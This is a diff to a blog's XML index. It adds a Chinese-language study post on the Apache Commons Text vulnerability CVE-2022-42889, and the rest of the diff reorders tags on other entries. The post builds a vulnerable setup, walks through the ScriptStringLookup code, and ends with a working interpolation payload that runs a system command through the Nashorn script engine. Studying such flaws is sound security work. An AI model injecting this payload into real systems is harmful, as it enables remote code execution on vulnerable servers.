@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>CVE-2022-42889 Apache Commons Text RCE 漏洞学习</title>
+    <link href="/2022/11/23/CVE-2022-42889-Apache-Commons-Text-RCE-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
+    <url>/2022/11/23/CVE-2022-42889-Apache-Commons-Text-RCE-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>可以在<a href="https://mvnrepository.com/artifact/org.apache.commons/commons-text" target="_blank" rel="noopener">maven仓库</a>里直观地看到存在漏洞的软件版本：</p><p><img src="/css/images/CVE-2022-42889/2022112301.png" srcset="/img/loading.gif" alt=""></p><p>于是新建一个Java项目，加入受漏洞影响的Apache Commons Text依赖：</p><pre><code class="xml">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-text --&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;    &lt;artifactId&gt;commons-text&lt;/artifactId&gt;    &lt;version&gt;1.8&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>不知道为什么下载不到1.9版本的，搞不懂。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>看一看官方的<a href="https://commons.apache.org/proper/commons-text/userguide.html" target="_blank" rel="noopener">入门指导</a>。</p><p>Apache Commons Text是一个文本处理库，可以通过\${prefix:name}的写法对字符串进行灵活处理，比如入门指导中给出的快速文本处理示例代码，这里我删掉了一些跟文件有关的处理避免发生文件不存在的问题：</p><pre><code class="java">final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();final String text = interpolator.replace(&quot;Base64 Decoder:        ${base64Decoder:SGVsbG9Xb3JsZCE=}\n&quot; +    &quot;Base64 Encoder:        ${base64Encoder:HelloWorld!}\n&quot; +    &quot;Java Constant:         ${const:java.awt.event.KeyEvent.VK_ESCAPE}\n&quot; +    &quot;Date:                  ${date:yyyy-MM-dd}\n&quot; +    &quot;Environment Variable:  ${env:USERNAME}\n&quot; +    &quot;Java:                  ${java:version}\n&quot; +    &quot;Localhost:             ${localhost:canonical-name}\n&quot; +    &quot;Resource Bundle:       ${resourceBundle:org.apache.commons.text.example.testResourceBundleLookup:mykey}\n&quot; +    &quot;System Property:       ${sys:user.dir}\n&quot; +    &quot;URL Decoder:           ${urlDecoder:Hello%20World%21}\n&quot; +    &quot;URL Encoder:           ${urlEncoder:Hello World!}\n&quot;);</code></pre><p>将处理完后的文本打印出来，可以看到：</p><p><img src="/css/images/CVE-2022-42889/2022112302.png" srcset="/img/loading.gif" alt=""></p><p>很明显，Apache Commons Text可以通过在字符串中使用\${prefix:name}格式的字符串进行字符串的插入，其中prefix代表了要对源字符串做的处理，而name代表了源字符串，如第一个字符串插值${base64Decoder:SGVsbG9Xb3JsZCE=}就代表了对name进行base64解码后插入字符串中。</p><p>根据<a href="https://www.cve.org/CVERecord?id=CVE-2022-42889" target="_blank" rel="noopener">漏洞通告</a>所说，prefix代表的其实是Apache Commons Text里面org.apache.commons.text.lookup.StringLookup这个接口的实现类，在IDEA里面搜索一下继承了该接口的类：</p><p><img src="/css/images/CVE-2022-42889/2022112303.png" srcset="/img/loading.gif" alt=""></p><p>可以很明显地看到，有一些类就是示例代码中使用到的文本处理类，按照漏洞通告的说法，其中有三个StringLookup类存在利用方法：</p><pre><code>These lookups are: - &quot;script&quot; - execute expressions using the JVM script execution engine (javax.script) - &quot;dns&quot; - resolve dns records - &quot;url&quot; - load values from urls, including from remote servers </code></pre><p>其中script这个prefix看起来就特别可疑，似乎可以调用脚本引擎，找到其对应的ScriptStringLookup类，可以在注释里看到使用方法：</p><pre><code>${script:javascript:3 + 4}</code></pre><p>看起来是调用了JavaScript引擎运行了后面的代码，接下来分析一下执行文本处理地该类的lookup函数：</p><pre><code class="java">@Overridepublic String lookup(final String key) {    if (key == null) {        return null;    }    final String[] keys = key.split(SPLIT_STR);    final int keyLen = keys.length;    if (keyLen != 2) {        throw IllegalArgumentExceptions.format(&quot;Bad script key format [%s]; expected format is DocumentPath:Key.&quot;,                key);    }    final String engineName = keys[0];    final String script = keys[1];    try {        final ScriptEngine scriptEngine = new ScriptEngineManager().getEngineByName(engineName);        if (scriptEngine == null) {            throw new IllegalArgumentException(&quot;No script engine named &quot; + engineName);        }        return Objects.toString(scriptEngine.eval(script), null);    } catch (final Exception e) {        throw IllegalArgumentExceptions.format(e, &quot;Error in script engine [%s] evaluating script [%s].&quot;, engineName,                script);    }}</code></pre><p>可以看到非常可疑的两句代码：</p><pre><code class="java">final ScriptEngine scriptEngine = new ScriptEngineManager().getEngineByName(engineName);</code></pre><p>和：</p><pre><code class="java">return Objects.toString(scriptEngine.eval(script), null);</code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>参考常用的ScriptEngineManager：</p><pre><code>${script:nashorn:java.lang.Runtime.getRuntime().exec(&#39;calc&#39;)}</code></pre><hr><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Java Tomcat Valve内存马</title>
     <link href="/2022/11/22/Java-Tomcat-Valve%E5%86%85%E5%AD%98%E9%A9%AC/"/>
     <url>/2022/11/22/Java-Tomcat-Valve%E5%86%85%E5%AD%98%E9%A9%AC/</url>
@@ -2025,9 +2044,9 @@
       
       <tag>Web</tag>
       
-      <tag>复现</tag>
-      
       <tag>二进制</tag>
+      
+      <tag>复现</tag>
       
       <tag>PHPFPM</tag>
       
@@ -2651,9 +2670,9 @@
       
       <tag>Web</tag>
       
-      <tag>NodeJS</tag>
-      
       <tag>复现</tag>
+      
+      <tag>NodeJS</tag>
       
       <tag>前端</tag>
       
@@ -2992,9 +3011,9 @@
     
     <tags>
       
-      <tag>复现</tag>
-      
       <tag>二进制</tag>
+      
+      <tag>复现</tag>
       
       <tag>docker</tag>
       
@@ -3040,9 +3059,9 @@
     
     <tags>
       
-      <tag>复现</tag>
-      
       <tag>二进制</tag>
+      
+      <tag>复现</tag>
       
       <tag>Winrar</tag>
       
